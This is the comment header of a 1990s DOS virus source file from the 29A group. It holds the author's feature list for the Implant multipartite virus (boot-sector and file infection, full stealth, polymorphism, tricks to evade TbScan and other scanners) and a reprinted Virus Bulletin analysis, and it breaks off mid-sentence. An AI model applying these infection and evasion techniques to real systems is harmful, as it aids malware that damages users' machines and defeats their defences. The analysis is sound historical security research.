<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Multi.Implant.6200 - 29A_2.5_3.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;   ³        SuckSexee Automated Intruder         ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;   ³    Viral Implant Bio-Coded by GriYo/29A    ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Disclaimer:</span><span class="sc0">
</span><span class="sc1">;       ÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;       The author is not responsable of any problems caused due</span><span class="sc0">
</span><span class="sc1">;       to assembly of this file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Virus description:</span><span class="sc0">
</span><span class="sc1">;       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;       o Residency:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         The virus only goes resident when booting from an infected</span><span class="sc0">
</span><span class="sc1">;         hard drive or floppy disk.</span><span class="sc0">
</span><span class="sc1">;         While infecting files the virus uses UMB memory if</span><span class="sc0">
</span><span class="sc1">;         available.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       o Infection:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         1) Hard drive master-boot-record</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            The virus infects the HD MBR using direct port access</span><span class="sc0">
</span><span class="sc1">;            bypassing some TSR watchdogs and BIOS virus-protection</span><span class="sc0">
</span><span class="sc1">;            features.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         2) Floppy boot sector</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            SuckSexee formats an extra track on floppy and saves there</span><span class="sc0">
</span><span class="sc1">;            the original BS (for stealth) and its main body.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         3) Files (.COM .EXE and .SYS)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            The virus uses low level system file table.</span><span class="sc0">
</span><span class="sc1">;            Files are infected on close, get/set attribute, rename,</span><span class="sc0">
</span><span class="sc1">;            move or upon termination.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       o Stealth:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         This virus is full-stealth, so the system seems to be clean</span><span class="sc0">
</span><span class="sc1">;         while infected.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         1) Sector level</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            Attempts to read the HD MBR or floppy boot sector will result</span><span class="sc0">
</span><span class="sc1">;            in a clean copy being returned.</span><span class="sc0">
</span><span class="sc1">;            Attempts to read the sectors were the virus resides will not</span><span class="sc0">
</span><span class="sc1">;            be permitted.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         2) File level</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            Attempts to read an infected file will result in a clean</span><span class="sc0">
</span><span class="sc1">;            copy being returned, as the virus disinfects files on the</span><span class="sc0">
</span><span class="sc1">;            fly, including if a debugging tool is used to edit the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         3) Others...</span><span class="sc0">
</span><span class="sc1">;       </span><span class="sc0">
</span><span class="sc1">;            Directory, search and date/time stealth also supported</span><span class="sc0">
</span><span class="sc1">;            Whenever win.com is executed, the virus adds some</span><span class="sc0">
</span><span class="sc1">;            parameters to avoid problems with Windows 32bit disk access.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       o Armoured:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Attempts to write to the HD MBR or the sectors on which the virus</span><span class="sc0">
</span><span class="sc1">;         resides will not be permitted, but no error were returned</span><span class="sc0">
</span><span class="sc1">;         SuckSexee uses extended DOS partition trick, so infected</span><span class="sc0">
</span><span class="sc1">;         computers will not be able to boot from floppy.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       o Polymorphism:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         SuckSexee is encrypted under two encryption layers utilising a</span><span class="sc0">
</span><span class="sc1">;         polymorphic engine to generate first decryptor algorithm.</span><span class="sc0">
</span><span class="sc1">;         Generated polymorphic decryptor contains several conditional and</span><span class="sc0">
</span><span class="sc1">;         unconditional jumps as well as calls to subroutines and</span><span class="sc0">
</span><span class="sc1">;         interrupts.</span><span class="sc0">
</span><span class="sc1">;         The virus is polymorphic in all its infections.</span><span class="sc0">
</span><span class="sc1">;         This means that SuckSexee is polymorphic on hard drive MBR,</span><span class="sc0">
</span><span class="sc1">;         floppy boot sectors, .COM files, .EXE files and</span><span class="sc0">
</span><span class="sc1">;         also .SYS files.</span><span class="sc0">
</span><span class="sc1">;         While infecting floppy boot sectors the virus reads the</span><span class="sc0">
</span><span class="sc1">;         decryptor at MBR infection and uses it for each floppy.</span><span class="sc0">
</span><span class="sc1">;         While infecting files the virus will use the same decryptor</span><span class="sc0">
</span><span class="sc1">;         for each infected file.</span><span class="sc0">
</span><span class="sc1">;         If the system is rebooted a new mutation will be used</span><span class="sc0">
</span><span class="sc1">;         to infect files.</span><span class="sc0">
</span><span class="sc1">;         SuckSexee uses a timer to avoid multiple mutations in a</span><span class="sc0">
</span><span class="sc1">;         short period of time.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       o Retro:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;         Polymorphic engine uses slow mutation technics (see note above).</span><span class="sc0">
</span><span class="sc1">;         The virus avoids some self-check executables being infected.</span><span class="sc0">
</span><span class="sc1">;         SuckSexee waits over 10 min. before it starts infecting files.</span><span class="sc0">
</span><span class="sc1">;         The virus does not infect files that have V character or</span><span class="sc0">
</span><span class="sc1">;         digit(s) in their names.</span><span class="sc0">
</span><span class="sc1">;         Command line parameters force TbScan to use compatibility</span><span class="sc0">
</span><span class="sc1">;         mode (so files can be stealthed and infected while</span><span class="sc0">
</span><span class="sc1">;         scanning) and skip memory scanning.</span><span class="sc0">
</span><span class="sc1">;         The virus encrypts the original MBR for a difficult recovery.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Virus Bulletin speaks</span><span class="sc0">
</span><span class="sc1">;       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;       Thanks to mgl for the typing :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; VIRUS BULLETIN MAY 1997</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Silicon Implants</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Igor Muttik</span><span class="sc0">
</span><span class="sc1">; Dr Solomon's Software Ltd</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; In February this Year, I received some flies which had been</span><span class="sc0">
</span><span class="sc1">; downloaded from an Internet virus exchange site and</span><span class="sc0">
</span><span class="sc1">; forwarded to us for analysis.  'Ah, the usual rubbish...', I</span><span class="sc0">
</span><span class="sc1">; thought; for it is rare to get new (let alone interesting!)</span><span class="sc0">
</span><span class="sc1">; viruses from such sources - if a file is not already identified</span><span class="sc0">
</span><span class="sc1">; as containing a known virus, it is usually either a corrupted</span><span class="sc0">
</span><span class="sc1">; virus, or not a virus at all.  It looked as though this would</span><span class="sc0">
</span><span class="sc1">; again be the case, but then, amongst  these files, I came</span><span class="sc0">
</span><span class="sc1">; across a new virus - Implant.6128.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Implant is unusual in many aspects - it has full stealth, and</span><span class="sc0">
</span><span class="sc1">; is both polymorphic and multi-partite.  Stranger still, it works</span><span class="sc0">
</span><span class="sc1">; reliably - I have never seen a virus so complex and yet so</span><span class="sc0">
</span><span class="sc1">; stable. After all, it is both well known and intuitively obvious</span><span class="sc0">
</span><span class="sc1">; that as software gets more complex, it has more bugs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; In my opinion, this explains perfectly why primitive computer</span><span class="sc0">
</span><span class="sc1">; viruses (most boot sector and macro infectors) are the most</span><span class="sc0">
</span><span class="sc1">; common in the wild.  Sophisticated viruses have more bugs,</span><span class="sc0">
</span><span class="sc1">; and thus have a smaller chance of surviving unnoticed in the</span><span class="sc0">
</span><span class="sc1">; field. Implant is a rare exception to this general rule.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Returning to the virus' specifics, it is extremely polymorphic.</span><span class="sc0">
</span><span class="sc1">; The complexity of its decryptor by far exceeds that of</span><span class="sc0">
</span><span class="sc1">; many other famous polymorphic viruses. It is also extremely</span><span class="sc0">
</span><span class="sc1">; multi-partite, infecting COM, EXE and SYS files as well as</span><span class="sc0">
</span><span class="sc1">; the hard disk MBR and floppy boot sectors.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Finally, Implant makes it impossible to boot the computer</span><span class="sc0">
</span><span class="sc1">; from a clean DOS system diskette: it does this using the</span><span class="sc0">
</span><span class="sc1">; circular extended partition technique, first seen implemented</span><span class="sc0">
</span><span class="sc1">; in Rainbow [see VB, September- 1995, P. 12].</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Initial Infection</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; When an infected file is run, or the infected floppy is left in</span><span class="sc0">
</span><span class="sc1">; the A: drive at boot time, the virus takes control in the</span><span class="sc0">
</span><span class="sc1">; traditional manner. After it decrypts itself, it checks the</span><span class="sc0">
</span><span class="sc1">; processor type: if the computer is 8088- or 80286-based (i.e.</span><span class="sc0">
</span><span class="sc1">; is an XT or an AT).  Implant immediately infects another</span><span class="sc0">
</span><span class="sc1">; file. However, if the machine is an 80386 or above, the virus</span><span class="sc0">
</span><span class="sc1">; issues its 'Are you there?' call - Int 12h, CX=029Ah, SI=OBADH,</span><span class="sc0">
</span><span class="sc1">; DI=FACEh.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If, on return from the call, the SI and DI registers are set to</span><span class="sc0">
</span><span class="sc1">; DEADH and BABEH respectively (I wonder how many other</span><span class="sc0">
</span><span class="sc1">; words can be squeezed into 16 bits?) the virus assumes it is</span><span class="sc0">
</span><span class="sc1">; already active and proceeds to infect a file. Otherwise (if it</span><span class="sc0">
</span><span class="sc1">; is not already resident), it creates an array of 1024 random</span><span class="sc0">
</span><span class="sc1">; bytes (which will later be used by the virus' polymorphic</span><span class="sc0">
</span><span class="sc1">; engine) and passes control to the hard disk infection routine.</span><span class="sc0">
</span><span class="sc1">; This routine copies the MBR to sector 3 on track 0, and then</span><span class="sc0">
</span><span class="sc1">; finds the active partition record in the partition table,</span><span class="sc0">
</span><span class="sc1">; checking whether it is a 16-bit FAT DOS system (that is, the</span><span class="sc0">
</span><span class="sc1">; type field is set to 4 or 6).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If so, Implant removes the active flag, sets the partition type</span><span class="sc0">
</span><span class="sc1">; to 5 (Extended DOS partition) and makes the pointer to its</span><span class="sc0">
</span><span class="sc1">; first sector point to the MBR (creating a so-called 'circular</span><span class="sc0">
</span><span class="sc1">; extended partition').</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then the virus analyses the code in the MBR: it follows the</span><span class="sc0">
</span><span class="sc1">; jump chain (if present), and puts its code at the destination</span><span class="sc0">
</span><span class="sc1">; of the final jump - the virus code is such that it needs to</span><span class="sc0">
</span><span class="sc1">; leave only 35 bytes in the MBR!  Implant next writes the</span><span class="sc0">
</span><span class="sc1">; MBR back to disk by direct manipulation of I/0 ports (this</span><span class="sc0">
</span><span class="sc1">; will make it compatible with IDE and MFM drives, but</span><span class="sc0">
</span><span class="sc1">; not SCSI).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; After the write attempt, the virus rereads the MBR and</span><span class="sc0">
</span><span class="sc1">; checks whether the checksum of what was read matches</span><span class="sc0">
</span><span class="sc1">; what was written.  If not, the virus gives up, and passes</span><span class="sc0">
</span><span class="sc1">; control to the host program.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Then the virus writes its body into 12 sectors on track 0</span><span class="sc0">
</span><span class="sc1">; starting at sector 4, right after the saved MBR.  Implant does</span><span class="sc0">
</span><span class="sc1">; not forget to check whether there is sufficient space on</span><span class="sc0">
</span><span class="sc1">; track 0 - if there are fewer than 13 sectors before the start of</span><span class="sc0">
</span><span class="sc1">; an active partition, the virus will not infect the hard drive.</span><span class="sc0">
</span><span class="sc1">; nor modify anything on track 0.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Implant does not recognize itself in the MBR.  It just checks</span><span class="sc0">
</span><span class="sc1">; whether a resident copy is already present using its 'Are you</span><span class="sc0">
</span><span class="sc1">; there?' call.  If it is not in memory, it loads the MBR and</span><span class="sc0">
</span><span class="sc1">; scans for an active partition.  An already-infected MBR will</span><span class="sc0">
</span><span class="sc1">; not have this, so the infection will fail at this point - there is</span><span class="sc0">
</span><span class="sc1">; no risk of multiple infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; There are two main branches in the virus code. If the virus is</span><span class="sc0">
</span><span class="sc1">; run from a file (COM, EXE or SYS), control transfers to the</span><span class="sc0">
</span><span class="sc1">; host and nothing is left resident in memory. If, however, the</span><span class="sc0">
</span><span class="sc1">; virus is run from a boot sector (either that of a floppy or the</span><span class="sc0">
</span><span class="sc1">; hard disk's MBR), it seizes 7KB of DOS memory (by the</span><span class="sc0">
</span><span class="sc1">; familiar technique of reducing the word at memory offset</span><span class="sc0">
</span><span class="sc1">; [0:413h]), copies itself to the newly-created hole in memory</span><span class="sc0">
</span><span class="sc1">; just beneath the top of conventional memory, and intercepts</span><span class="sc0">
</span><span class="sc1">; some system interrupts.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The method by which the virus infects the hard drive means</span><span class="sc0">
</span><span class="sc1">; that an MS-DOS system floppy cannot be used to clean-boot</span><span class="sc0">
</span><span class="sc1">; an Implant-infected PC. The circular extended partition will</span><span class="sc0">
</span><span class="sc1">; make MS-DOS v5 onwards, Novell DOS 7, and DR-DOS 6</span><span class="sc0">
</span><span class="sc1">; hang.  Fortunately, it is still possible to use versions 3.30 or</span><span class="sc0">
</span><span class="sc1">; 4.0 of MS-DOS, or PC-DOS 5 and 6, which will boot</span><span class="sc0">
</span><span class="sc1">; without problem.  After booting, however, drive C will still,</span><span class="sc0">
</span><span class="sc1">; of course, be inaccessible: attempts to access this drive will</span><span class="sc0">
</span><span class="sc1">; result in the error 'Invalid drive specification'.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Booting the Infected System</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; When booting, the virus hooks interrupts 12h (self-recogni-</span><span class="sc0">
</span><span class="sc1">; tion and stealth), 13h (disk I/0: for stealth and to infect</span><span class="sc0">
</span><span class="sc1">; floppies), and 1Ch (timer; to intercept DOS interrupts later</span><span class="sc0">
</span><span class="sc1">; on).  All three are used to intercept Int 21 h: the virus can do</span><span class="sc0">
</span><span class="sc1">; this in three ways:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - thirty seconds after the computer is booted (checked</span><span class="sc0">
</span><span class="sc1">;   using Int 1Ch)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - when an infected program is run: when such a proaram</span><span class="sc0">
</span><span class="sc1">;  issues the 'Are you there?' Int 12h call (see above) the</span><span class="sc0">
</span><span class="sc1">;  resident copy of a virus will immediately hook Int 21h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - when a program attempts to write to disk using Int 13h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus has specific knowledge of some versions of DOS.</span><span class="sc0">
</span><span class="sc1">; and tries to get the real DOS entry point by following the</span><span class="sc0">
</span><span class="sc1">; jumps and doing some checks.  If an attempt to get the real</span><span class="sc0">
</span><span class="sc1">; entry point fails, the virus simply uses the one taken from</span><span class="sc0">
</span><span class="sc1">; the Interrupt Vector Table.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When the virus has hooked Int 21h, it monitors the following</span><span class="sc0">
</span><span class="sc1">; DOS functions: 2Ah (Get date; used in a payload), 4B00h</span><span class="sc0">
</span><span class="sc1">; (Exec), 3Eh (Close), 43h (Attribute), 56h (Rename/Move),</span><span class="sc0">
</span><span class="sc1">; 4Ch (Terminate), 3Dh (Open), 6Ch (Open/Create). 11h/12h</span><span class="sc0">
</span><span class="sc1">; (Findfirst/Findnext FCB), 4Eh/4Fh (Findfirst/Findnext), 3Fh</span><span class="sc0">
</span><span class="sc1">; (Read), 4B01h (Load), 40h (Write), 5700h (Get timestamp),</span><span class="sc0">
</span><span class="sc1">; 5701h (Set timestamp).  These functions are used to infect</span><span class="sc0">
</span><span class="sc1">; files and conceal infection (full stealth).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; During infection, the virus also intercepts Int 24h (Critical</span><span class="sc0">
</span><span class="sc1">; error handler) to suppress error messaaes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infection of Files</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; The virus infects files as they are run or opened. However, if</span><span class="sc0">
</span><span class="sc1">; any infected files are copied to diskette, the files on the</span><span class="sc0">
</span><span class="sc1">; diskette will be clean (despite the fact that the diskette's</span><span class="sc0">
</span><span class="sc1">; boot sector is infected) - Implant is 'full stealth'.  Running</span><span class="sc0">
</span><span class="sc1">; the file from the floppy does not infect it either. How, then.</span><span class="sc0">
</span><span class="sc1">; are infected files passed between users?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The first thing the virus checks when any program calls any</span><span class="sc0">
</span><span class="sc1">; monitored DOS function is the program's name, paying</span><span class="sc0">
</span><span class="sc1">; special attention to files named AR*.*, PK*.*. LH*.*, and</span><span class="sc0">
</span><span class="sc1">; BA*.* (archiving utilities, specifically,  ARJ, PKZIP,  LHA</span><span class="sc0">
</span><span class="sc1">; and BACKUP). This information is used to turn off stealth</span><span class="sc0">
</span><span class="sc1">; mode when any of these archivers is executed.  Thus, the</span><span class="sc0">
</span><span class="sc1">; virus ensures all executable files are packed into archives</span><span class="sc0">
</span><span class="sc1">; and backups are infected, whether on floppy or hard disk.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Further, it will not infect files called TB*.*, SC*.*, F-*.*,</span><span class="sc0">
</span><span class="sc1">; GU*.*, nor those containing the letters V, MO, IO,  DO,  IB</span><span class="sc0">
</span><span class="sc1">; or the digits 0-9.  Thus the virus avoids a wide variety of</span><span class="sc0">
</span><span class="sc1">; anti-virus programs,  DOS system files, and goat files used</span><span class="sc0">
</span><span class="sc1">; by virus researchers (which usually have digits in the name).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Implant infects only files with the extensions COM,  EXE</span><span class="sc0">
</span><span class="sc1">; and SYS.  COM and SYS files longer than 52801 bytes are</span><span class="sc0">
</span><span class="sc1">; not infected.  Files with time-stamps set to 62 seconds are</span><span class="sc0">
</span><span class="sc1">; assumed already infected - this is the virus' infection stamp.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To check whether a file is an EXE file, the virus adds the</span><span class="sc0">
</span><span class="sc1">; first two bytes of the file (for an EXE file, 4D5A or 5A4D)</span><span class="sc0">
</span><span class="sc1">; together: if the sum is A7h (A7h=4Dh+5Ah), the file is</span><span class="sc0">
</span><span class="sc1">; assumed to have an EXE header.  Simple and elegant.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When resident, Implant denies access to files named</span><span class="sc0">
</span><span class="sc1">; CHKLIS*.*. These patterns match CHKLIST.MS or</span><span class="sc0">
</span><span class="sc1">; CHKLIST.CPS, and prevent Microsoft's and Central</span><span class="sc0">
</span><span class="sc1">; Point's scanners from working properly.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If WIN.COM is executed, the virus adds a parameter ID:F to</span><span class="sc0">
</span><span class="sc1">; the program's command-line. This argument turns off</span><span class="sc0">
</span><span class="sc1">; Windows' 32-bit disk access, which enables infection of</span><span class="sc0">
</span><span class="sc1">; floppies accessed from within Windows.  If TBSCAN is</span><span class="sc0">
</span><span class="sc1">; executed, the virus adds the command-line parameters 'co'</span><span class="sc0">
</span><span class="sc1">; and 'nm', which instruct the program to skip the memory</span><span class="sc0">
</span><span class="sc1">; cheek and not use direct disk access ('compatibility mode').</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infection of Floppies</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; The floppy disk boot sector is infected in much the same</span><span class="sc0">
</span><span class="sc1">; manner as the MBR.  The virus follows the jump chain in the</span><span class="sc0">
</span><span class="sc1">; floppy boot sector and writes 35 bytes of its code there. The</span><span class="sc0">
</span><span class="sc1">; encrypted polymorphic virus body is placed on a floppy on</span><span class="sc0">
</span><span class="sc1">; an additional track (number 80) which it first formats. This</span><span class="sc0">
</span><span class="sc1">; track will have 13 sectors: the first will carry a copy of an</span><span class="sc0">
</span><span class="sc1">; original boot sector: the rest will be occupied by the</span><span class="sc0">
</span><span class="sc1">; encrypted virus body.  To infect floppy disks,  Implant uses</span><span class="sc0">
</span><span class="sc1">; Int 40h, which usually points to BIOS code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus infects only 1.2MB or 1.44MB floppies.  It checks</span><span class="sc0">
</span><span class="sc1">; the total amount of sectors on the media (the word at offset</span><span class="sc0">
</span><span class="sc1">; 13h in the boot sector) and proceeds with infection only if</span><span class="sc0">
</span><span class="sc1">; the number of sectors is B40h or 960h (2880 or 2400,</span><span class="sc0">
</span><span class="sc1">; respectively). For self-recognition, the virus cheeks the two</span><span class="sc0">
</span><span class="sc1">; letters at offset 21 h from the last jump in the chain (if any):</span><span class="sc0">
</span><span class="sc1">; all infected floppies contain the marker 'CR' at this point.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; There is a bug in floppy infection: if the boot sector starts</span><span class="sc0">
</span><span class="sc1">; with a JMP (opcode E9h, not usual EBh), the virus code is</span><span class="sc0">
</span><span class="sc1">; inserted 1 byte lower than necessary. Still, the virus is able</span><span class="sc0">
</span><span class="sc1">; to work as the first instruction of its code is CLI, which</span><span class="sc0">
</span><span class="sc1">; takes just 1 byte and is not absolutely necessary.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Polymorphic Engine</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Implant's polymorphic engine is very powerful.  Suffice it to</span><span class="sc0">
</span><span class="sc1">; say that it supports subroutines, conditional jumps with non-</span><span class="sc0">
</span><span class="sc1">; zero displacement, and memory writes.  This engine takes a</span><span class="sc0">
</span><span class="sc1">; good half of the virus' code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The engine makes extensive use of the table of random bytes,</span><span class="sc0">
</span><span class="sc1">; created during the initialization phase. The approach of</span><span class="sc0">
</span><span class="sc1">; using a table generated just once during the installation of</span><span class="sc0">
</span><span class="sc1">; the virus into memory classifies Implant as a slow polymor-</span><span class="sc0">
</span><span class="sc1">; phic.  This means that the variety of the polymorphic</span><span class="sc0">
</span><span class="sc1">; decryptors is artificially limited until the next reboot of the</span><span class="sc0">
</span><span class="sc1">; PC. It poses some problems for anti-virus researchers, as it</span><span class="sc0">
</span><span class="sc1">; becomes difficult to create enough files infected in enough</span><span class="sc0">
</span><span class="sc1">; different ways to test detection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Files are encrypted in two layers: the first is polymorphic:</span><span class="sc0">
</span><span class="sc1">; the second is simple XOR encryption with a slightly</span><span class="sc0">
</span><span class="sc1">; variable decrylptor.  Some attempts are made to prevent</span><span class="sc0">
</span><span class="sc1">; tracing the second decryptor, but no anti-emulation tricks</span><span class="sc0">
</span><span class="sc1">; are used.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Stealth Properties</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Implant stealths its modifications to the MBR and FBR.  The</span><span class="sc0">
</span><span class="sc1">; virus also does not allow writes to the sectors on track 0</span><span class="sc0">
</span><span class="sc1">; which are used by the MBR copy and the virus body</span><span class="sc0">
</span><span class="sc1">; (sectors 03h to 0Fh).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If any of the programs ME*.*. CH*.*, SY*.*, SM*.* is run</span><span class="sc0">
</span><span class="sc1">; (these patterns appear to be intended to match MEM.</span><span class="sc0">
</span><span class="sc1">; CHKDSK.  SYSINFO and SMAP) the virus spoofs the value</span><span class="sc0">
</span><span class="sc1">; returned by Int 12h (free RAM) by adding 7K to the real</span><span class="sc0">
</span><span class="sc1">; figure. Hence, the amount of memory is reported as it was</span><span class="sc0">
</span><span class="sc1">; before infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The stealthing of infected files is more sophisticated than</span><span class="sc0">
</span><span class="sc1">; that of the MBR and floppy boot sector.  Most modern</span><span class="sc0">
</span><span class="sc1">; stealth viruses do 'semi-stealth' (just the change in the file</span><span class="sc0">
</span><span class="sc1">; size is concealed). Implant, on the other hand, is full stealth,</span><span class="sc0">
</span><span class="sc1">; so when the virus is active. even integrity checking pro-</span><span class="sc0">
</span><span class="sc1">; grams will not report any file modifications.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; A common problem to all stealth viruses is how, to suppress</span><span class="sc0">
